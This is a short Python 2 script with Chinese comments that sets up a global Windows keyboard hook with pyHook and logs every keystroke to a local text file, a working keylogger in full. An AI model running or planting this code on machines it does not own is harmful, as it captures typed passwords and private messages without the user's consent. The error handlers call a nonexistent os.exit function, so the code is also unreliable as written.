#encoding=utf-8
import pythoncom  # pip2 install pywin32 这个库需要使用32位的python2.7版本
import pyHook # 下载安装pyHook  https://sourceforge.net/projects/pyhook/
import os

last_key = ""

def onKeyboardEvent(event):
    "处理键盘事件"
    try:
        # fobj.writelines("MessageName:%sn" % str(event.MessageName))
        # fobj.writelines("Message:%dn" % event.Message)
        # fobj.writelines("Time:%dn" % event.Time)
        # fobj.writelines("Window:%sn" % str(event.Window))
        # fobj.writelines("WindowName:%sn" % str(event.WindowName))
        # fobj.write("Ascii_code: %d\n" % event.Ascii)
        # fobj.write("Ascii_char:%s\n" % str(event.Ascii))
        global last_key
        if event.Key == last_key == "Lshift":
            return True
        print(event.Ascii)
        print(event.Key)
        print('\n')
        fobj.write("%s " % str(event.GetKey()))
        # print(dir(event))
        last_key = event.Key
        return True
    except:
        os.exit(0)

try:
    #打开日志文件
    file_name = "hook_log.txt"
    fobj = open(file_name, 'w')
    #创建hook句柄
    hm = pyHook.HookManager()
    #监控键盘
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()
    #循环获取消息
    pythoncom.PumpMessages()
    #关闭日志文件
    fobj.close()
except:
    os.exit(0)

    
